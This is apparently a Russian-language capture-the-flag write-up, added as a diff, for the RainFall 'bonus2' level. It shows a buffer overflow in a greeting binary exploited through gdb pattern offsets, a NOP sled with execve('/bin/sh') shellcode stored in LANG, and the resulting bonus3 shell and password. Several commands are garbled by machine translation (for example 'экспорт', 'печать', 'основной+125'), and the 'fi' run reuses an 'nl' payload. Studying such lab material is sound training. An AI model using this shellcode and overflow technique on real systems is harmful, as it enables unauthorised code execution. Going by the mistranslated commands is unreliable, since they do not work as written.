@@ -1,0 +1,89 @@
+Мы можем найти исполняемый файл, ожидающий двух входных данных, и распечатать их, разделив пробелом
+
+Проанализировав его с помощью gdb, мы можем найти две интересные функции: main() и greetuser().
+
+Итак, мы вводим в программу 2 аргумента. Затем он копирует не более 40 байт argv[1] в буфер и не более 32 байт argv[2] в том же буфере с индексом 40 (так после argv[1]).
+МЫ видим, что программа также проверяет переменную LANG env и устанавливает глобальную переменную либо в 1, если LANG равен "fi", либо в 2, если LANG равен "nl".
+Затем в greetuser он копирует сообщение (разной длины в зависимости от языка) в буфер размером 64 байта. А затем соедините с ним нашу строку, заданную в качестве параметра.
+Давайте попробуем получить смещение eip с различными возможными значениями LANG с помощью генератора шаблонов :
+
+    LANG!=fi && LANG!=nl
+
+(gdb) run $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08006241 in ?? ()              
+
+Если мы не зададим LANG, наша глобальная переменная будет равна 0. Затем объединение "Привет" и нашей строки, заданной в качестве параметра, выполняется в нашем буфере, но этого недостаточно, чтобы перезаписать eip.
+
+    LANG=fi
+
+bonus2@RainFall:~$ export LANG=fi
+bonus2@RainFall:~$ gdb bonus2
+(gdb) run $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41366141 in ?? ()
+
+    LANG=nl
+
+bonus2@RainFall:~$ export LANG=nl
+bonus2@RainFall:~$ gdb bonus2
+(gdb) run $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+
+Program received signal SIGSEGV, Segmentation fault.
+0x38614137 in ?? ()
+
+Если LANG является либо "fi", либо "nl", и параметр, переданный greetuser(), достаточно длинный, мы можем перезаписать обратный адрес (eip)
+
+Во-первых, нам понадобится шелл-код :
+    "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
+Во-вторых, поместите наш шелл-код в переменный язык env :
+    экспорт LANG=$(python -c 'печать("nl" +"\x90" * 100 +"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
+Конечно, вы можете записать на пленку "nl" или "fi".
+Затем создайте шаблоны для наших аргументов :
+    argv[1]: заполнение (40 байт)
+    argv[2]: заполнение (18 или 23 байта в зависимости от языка) + адрес внутри инструкций NOP (4 байта)
+Определите адрес внутри инструкций NOP :
+Найдите начальный адрес LANG с помощью gdb :
+        b *основной+125
+        запустите $(python -c 'печать "A"*40') лезвие
+        x/20 с ((символ*)окружающая среда)
+Затем добавьте случайное значение, чтобы получить адрес внутри инструкций NOP
+
+	LANG=nl
+
+bonus2@RainFall:~$ export LANG=$(python -c 'print("nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
+(gdb) b *main+125
+(gdb) run $(python -c 'print "A"*40') bla
+(gdb) x/20s *((char**)environ)
+0xbffffeb4 + 50 (random value) = 0xbffffee6
+bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\xe6\xfe\xff\xbf"')
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB
+$ whoami
+bonus3
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+$ exit
+bonus2@RainFall:~$
+
+	LANG=fi
+
+bonus2@RainFall:~$ export LANG=$(python -c 'print("nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
+(gdb) b *main+125
+(gdb) run $(python -c 'print "A"*40') bla
+(gdb) x/20s *((char**)environ)
+0xbffffeb4 + 50 (random value) = 0xbffffee6
+bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "\xe6\xfe\xff\xbf"')
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB
+$ whoami
+bonus3
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+$ exit
+bonus2@RainFall:~$ su bonus3
+Password:
+
